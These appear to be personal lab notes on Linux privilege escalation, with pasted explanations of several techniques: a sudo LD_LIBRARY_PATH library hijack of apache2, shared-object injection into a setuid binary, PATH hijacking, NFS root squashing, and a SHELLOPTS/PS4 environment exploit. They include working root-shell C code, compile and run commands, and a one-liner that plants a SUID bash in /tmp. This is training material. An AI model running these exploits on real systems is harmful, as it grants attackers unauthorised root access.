# Linux PrivEsc


![image](https://github.com/user-attachments/assets/19bf9abb-d4af-4c70-899e-a660abcce690)

writable etc/shadow
![image](https://github.com/user-attachments/assets/2a2626cf-12b6-4179-8deb-31acb2a31b26)

---------------
If the exploit doesn't work as expected, the issue is likely with the `library_path.c` code or how the shared object is being used. Here’s how you can troubleshoot and potentially fix the problem.

### **1. Understanding Why It Might Fail**

Several factors could cause the exploit to fail:

- **Functionality Mismatch**: The custom shared object might not correctly mimic the functions expected by `apache2`. If `apache2` calls a function from `libcrypt.so.1` and the custom shared object doesn't provide it (or provides it incorrectly), the program might crash or fail to execute.
  
- **Security Mechanisms**: Modern systems may have security mechanisms in place that detect and block this type of exploitation. For example, `LD_LIBRARY_PATH` might be ignored by `sudo` for certain binaries.

- **Library Path Precedence**: The `LD_LIBRARY_PATH` variable might not be properly overriding the library path, causing the original library to be loaded instead of your malicious version.

### **2. Troubleshooting Steps**

#### **Step 1: Verify Basic Functionality**
- Ensure that your compiled shared object (`libcrypt.so.1`) is being used by `apache2`. You can use `strace` to trace system calls and check if your library is being loaded:
  ```bash
  strace -e openat sudo LD_LIBRARY_PATH=/tmp apache2 2>&1 | grep libcrypt.so.1
  ```
  This should show if `apache2` is attempting to load `/tmp/libcrypt.so.1`.

#### **Step 2: Debugging**
- If the program crashes or doesn't run as expected, try running `apache2` without `sudo` to see if it provides any error messages or clues:
  ```bash
  LD_LIBRARY_PATH=/tmp apache2
  ```

- Use `gdb` (GNU Debugger) to step through the execution of `apache2` and see where it fails:
  ```bash
  sudo gdb --args apache2
  ```
  This can help identify if the issue is with a specific function or if `apache2` is even reaching the point where your shared object should execute.

#### **Step 3: Simplify the Exploit**
- Start by writing a very basic shared object that you know should execute correctly:
  ```c
  #include <stdio.h>
  #include <stdlib.h>

  void init() {
      printf("Injected library loaded!\n");
      system("/bin/sh");
  }
  ```
  - The `init()` function in this code will be called when the shared object is loaded. It prints a message and then spawns a shell. Compile and test it:
    ```bash
    gcc -o /tmp/libcrypt.so.1 -shared -fPIC /path/to/your/simplified_library.c
    sudo LD_LIBRARY_PATH=/tmp apache2
    ```

- If this simplified exploit works, then the issue lies in how `library_path.c` was originally implemented.

### **3. Modifying `library_path.c`**

Here’s how you could modify the `library_path.c` file to better mimic the original library:

#### **Step 1: Implement Necessary Functions**
- Determine which functions are called by `apache2` from `libcrypt.so.1`. You might need to implement those functions in `library_path.c`.

  For example, `libcrypt.so.1` typically provides functions like `crypt()`. Here’s a simplified version:
  ```c
  #define _GNU_SOURCE
  #include <stdio.h>
  #include <stdlib.h>
  #include <unistd.h>

  char *crypt(const char *key, const char *salt) {
      printf("crypt() called with key: %s and salt: %s\n", key, salt);
      setuid(0);   // Set user ID to root
      setgid(0);   // Set group ID to root
      system("/bin/sh");  // Spawn a root shell
      return "pwned";
  }

  // Include any other necessary functions here
  ```

- Compile and test this modified code. The key is to ensure that any functions `apache2` expects from `libcrypt.so.1` are provided.

#### **Step 2: Test with Other Libraries**
- If `libcrypt.so.1` still doesn't work, try using another library like `libpcre.so.3` or `libaprutil-1.so.0`. Follow the same steps:
  ```bash
  gcc -o /tmp/libpcre.so.3 -shared -fPIC /path/to/your/simplified_library.c
  sudo LD_LIBRARY_PATH=/tmp apache2
  ```

### **4. Final Tips**

- **Incremental Development**: Start with a very basic shared object, confirm it works, and then gradually add complexity. This makes it easier to identify what’s going wrong.

- **Review Permissions**: Ensure that your `sudo` setup isn't restricting `LD_LIBRARY_PATH`. Some configurations of `sudo` prevent certain environment variables from being passed through.

- **Consult Logs**: Check system logs (e.g., `/var/log/syslog` or `/var/log/auth.log`) for any security alerts or errors related to your attempts.

### **Conclusion**

If you carefully mimic the necessary functions in `library_path.c`, you should be able to trick `apache2` into loading your malicious library and spawning a root shell. If it still doesn’t work, consider testing with different libraries or exploring additional debugging techniques. This approach requires both creativity and careful debugging to ensure that the exploit works as intended.

-------
![image](https://github.com/user-attachments/assets/7c590036-a412-4712-8833-f5ec242bfccd)

![image](https://github.com/user-attachments/assets/18df440b-e032-4a08-a69e-ffca807587b9)
The scenario you've provided is an example of a **shared object injection** attack on a setuid binary. Let's break down what's happening step by step:

### 1. **Understanding the Setuid Binary `/usr/local/bin/suid-so`**
   - The binary `/usr/local/bin/suid-so` is a setuid executable. This means it runs with the privileges of its owner (likely `root`), even if executed by a regular user.
   - The task is to exploit this binary by injecting a malicious shared object (a `.so` file) to gain elevated privileges.

### 2. **Executing the Binary**
   - When you run `/usr/local/bin/suid-so`, it likely performs some operations and then exits, possibly showing a progress bar.

### 3. **Using `strace` to Monitor System Calls**
   - The command `strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"` is used to trace the system calls made by `suid-so`.
   - `strace` records all the system calls the binary makes, including file operations.
   - The `grep` command filters out the output to show only `open`, `access`, or "no such file" related calls. These calls can indicate which files the binary is trying to open or check access for, and whether it fails to find them.

### 4. **Identifying the Missing Shared Object**
   - The `strace` output indicates that `/usr/local/bin/suid-so` tries to load a shared object file named `/home/user/.config/libcalc.so` but cannot find it. This missing file presents an opportunity to exploit the binary.

### 5. **Creating the Required Directory**
   - The attacker (you) then creates the missing `.config` directory in the home directory to place the malicious shared object:
     ```bash
     mkdir /home/user/.config
     ```

### 6. **Compiling the Malicious Shared Object**
   - A C source file located at `/home/user/tools/suid/libcalc.c` is provided, which likely contains code to spawn a shell.
   - You compile this C file into a shared object using `gcc`:
     ```bash
     gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
     ```
   - The `-shared` and `-fPIC` flags are used to compile a shared object (`.so` file), which can be dynamically loaded by programs.

### 7. **Executing the Exploit**
   - After placing the malicious `libcalc.so` in the directory where `suid-so` expects it, you run the `suid-so` binary again:
     ```bash
     /usr/local/bin/suid-so
     ```
   - This time, instead of the program functioning normally, it loads your malicious `libcalc.so`, which executes the code inside it.
   - If the malicious code is written to spawn a shell with elevated privileges (e.g., a root shell), you now gain root access.

### 8. **Gaining Root Access**
   - The result of this exploitation is that you get a root shell. Since the original binary was running with root privileges (due to being a setuid binary), and it loaded your malicious shared object, your shell inherits these privileges.

### **Summary of the Attack**
This is an example of a **shared object injection attack**:
- The binary attempts to load a shared object from a specific location that does not exist.
- By creating a directory and placing a malicious shared object there, you trick the binary into loading your code.
- Since the binary is setuid and runs as root, when it loads your shared object, it executes with root privileges, giving you a root shell.

**Important**: This type of attack can only work if the binary is configured in a way that allows arbitrary shared objects to be loaded. In real-world scenarios, proper system hardening, such as disabling setuid binaries or using modern techniques like namespace isolation, can mitigate these kinds of vulnerabilities.

--------------
![image](https://github.com/user-attachments/assets/c4987b52-3192-4d73-9c0c-4aa145850adc)
The scenario you've provided is another example of exploiting a setuid (or setgid) executable by leveraging **environment variables**, particularly the `PATH` environment variable. Let's break it down:

### 1. **Understanding the Setuid Binary `/usr/local/bin/suid-env`**
   - The binary `/usr/local/bin/suid-env` is a setuid executable, meaning it runs with the privileges of its owner (likely `root`) when executed by any user.
   - The key issue here is that this binary does not use absolute paths when trying to execute other programs or scripts. Instead, it relies on the `PATH` environment variable, which can be manipulated by the user.

### 2. **Initial Execution of the Binary**
   - When you run `/usr/local/bin/suid-env`, it seems to be attempting to start the Apache2 web server.
   - The exact command might look something like `service apache2 start`, but because the full path (`/usr/sbin/service`) isn't specified, it will look in directories listed in the `PATH` environment variable.

### 3. **Using `strings` to Identify Hardcoded Commands**
   - The command `strings /usr/local/bin/suid-env` is used to search the binary for printable strings.
   - By doing this, you discover that the binary calls `service apache2 start`. However, it doesn't specify the full path, which means it relies on the `PATH` variable to locate the `service` executable.

### 4. **Compiling a Malicious Executable**
   - You compile a simple C program located at `/home/user/tools/suid/service.c` into an executable named `service`.
   - This program is designed to spawn a shell. For example, the C code might look something like this:

     ```c
     #include <stdlib.h>
     
     int main() {
         setuid(0);  // Set the effective user ID to root
         setgid(0);  // Set the effective group ID to root
         system("/bin/bash");  // Spawn a root shell
         return 0;
     }
     ```

   - The command to compile it might look like this:
     ```bash
     gcc -o service /home/user/tools/suid/service.c
     ```

### 5. **Manipulating the `PATH` Environment Variable**
   - Before running the vulnerable binary again, you prepend the current directory (`.`) to the `PATH` environment variable:
     ```bash
     PATH=.:$PATH /usr/local/bin/suid-env
     ```
   - This adjustment means that when the `suid-env` binary tries to run `service`, it will find your malicious `service` executable in the current directory before it finds the real `/usr/sbin/service`.

### 6. **Executing the Exploit**
   - When you run the `suid-env` binary again, it will execute your malicious `service` program instead of the legitimate one.
   - Because `suid-env` is running with root privileges and it runs the `service` executable found in the current directory (due to the modified `PATH`), your malicious program executes with root privileges.
   - As a result, your malicious `service` executable spawns a root shell.

### 7. **Gaining Root Access**
   - Now, you have a root shell, allowing you to perform any actions with full system privileges.

### **Summary of the Attack**
This is an example of a **PATH hijacking attack**:
- The `suid-env` binary uses the `PATH` environment variable to locate executables.
- By manipulating `PATH`, you trick the binary into executing your malicious executable instead of the intended one.
- Since the original binary runs with elevated privileges, so does your malicious executable, giving you a root shell.

**Important**: This type of attack can be mitigated by always using absolute paths when calling external executables in privileged programs and by sanitizing environment variables before using them. Proper system hardening, like setting `secure_path` in `/etc/sudoers` or using modern privilege separation techniques, can also prevent such vulnerabilities.


-----------

Root squashing is a security feature typically used in Network File System (NFS) environments to prevent remote users with root privileges on their local machines from having root privileges on the NFS server. Here's what happens when root squashing is enabled:

### What is Root Squashing?
- **Root Squashing** is a setting in NFS that maps the `root` user (with user ID 0) to a less-privileged user, typically the "nobody" user, when accessing files on an NFS-mounted filesystem.
- The "nobody" user usually has minimal privileges, preventing root users from making changes to files on the NFS server that require root access.

### How Root Squashing Works:
1. **NFS Server Configuration**: 
   - When setting up an NFS export, the server administrator can enable root squashing by using the `root_squash` option in the NFS configuration. 
   - Example entry in `/etc/exports`:
     ```
     /shared_directory client_ip(rw,root_squash)
     ```
   - This configuration says that when a client (even one with root privileges) mounts `/shared_directory`, any actions by the root user will be mapped to the "nobody" user.

2. **User ID Mapping**:
   - When a root user on the client system (user ID 0) tries to access the NFS-mounted directory, their requests are mapped to the "nobody" user, which typically has user ID 65534 and group ID 65534.
   - As a result, the root user on the client will not have root privileges on the NFS server. Instead, their access rights will be the same as the "nobody" user on the server, which are usually quite limited.

### Implications:
- **Security**: This helps prevent a malicious or compromised root user on a client machine from potentially damaging or modifying files on the NFS server.
- **File Ownership and Permissions**: Files created by the root user on the client machine will be owned by "nobody" on the NFS server, and the root user won't be able to modify files on the server that require root privileges.

### Example Scenario:
- Suppose you have an NFS server exporting a directory with the `root_squash` option enabled.
- On the client machine, a user with root privileges tries to create a file in the NFS-mounted directory.
- Even though the user is root on the client machine, the file will be created with ownership assigned to the "nobody" user on the NFS server. Additionally, the root user will not be able to change permissions or modify files that require root access on the NFS server.

### Important Notes:
- **NFSv4**: In NFSv4, root squashing can be more flexible, with the ability to map root to a different user other than "nobody," depending on the server configuration.
- **Disabling Root Squashing**: If root squashing is not desired, it can be disabled using the `no_root_squash` option. This will allow root on the client to act as root on the NFS server, which might be necessary in some trusted environments but poses a significant security risk in less-trusted or multi-tenant environments.

Root squashing is a simple yet effective mechanism for enforcing least privilege and protecting sensitive file systems on NFS servers from unauthorized access or modifications by root users on client machines.

-----
![image](https://github.com/user-attachments/assets/4951aef8-2341-44aa-a393-bd41e436fb5b)

---
      env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2


The command you've provided is an example of exploiting a vulnerability related to **environment variables** in combination with a **Set-UID (SUID)** binary. This specific command takes advantage of a particular flaw in how the `suid-env2` binary might handle the `SHELLOPTS` and `PS4` environment variables.

Let’s break down what’s happening step by step:

### 1. `env -i`
- The `env -i` command starts a command with an empty environment, meaning all environment variables are cleared, except those explicitly defined afterward.
- This is typically done to ensure that the environment is controlled and contains only what the attacker wants to include.

### 2. `SHELLOPTS=xtrace`
- `SHELLOPTS` is an environment variable in bash that controls which shell options are enabled.
- Setting `SHELLOPTS` to `xtrace` causes the shell to print each command before executing it, which is useful for debugging. This is typically invoked by using `set -x` within a shell script.

### 3. `PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)'`
- `PS4` is another environment variable in bash that defines the prompt printed before the command when `xtrace` (or `set -x`) is enabled. The default is `+ `.
- Here, the `PS4` variable is set to a command substitution: `$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)`. When the `xtrace` feature is invoked, this command is executed.
  - `cp /bin/bash /tmp/rootbash`: This copies the bash binary to `/tmp/rootbash`.
  - `chmod +xs /tmp/rootbash`: This sets the SUID bit on `/tmp/rootbash`, making it a SUID binary. When executed, this file will run with the privileges of the file's owner (in this case, likely root).

### 4. `/usr/local/bin/suid-env2`
- This is the SUID binary that the attacker is targeting. It likely has the SUID bit set, meaning it runs with elevated privileges (e.g., root privileges).
- The expectation here is that the `suid-env2` binary will invoke a bash shell or script without properly sanitizing or resetting the `SHELLOPTS` and `PS4` environment variables. As a result, it will enable the `xtrace` option, which will trigger the command defined in `PS4`.

### The Exploit
- When `/usr/local/bin/suid-env2` runs, it interprets the environment variables set by the attacker.
- Because of `SHELLOPTS=xtrace`, every command that is run within the SUID binary might trigger the execution of the command in `PS4`.
- This effectively runs `cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash` with root privileges, creating a root-owned, SUID-enabled shell at `/tmp/rootbash`.

### Outcome
- After executing this command, you would be able to run `/tmp/rootbash -p`, which gives you a root shell, allowing you to execute commands as the root user.

### Security Implication
This is a classic example of how improper handling of environment variables in privileged executables (like SUID binaries) can lead to privilege escalation. To mitigate such risks, privileged binaries should always sanitize and reset the environment variables to a safe state before executing any commands or scripts.

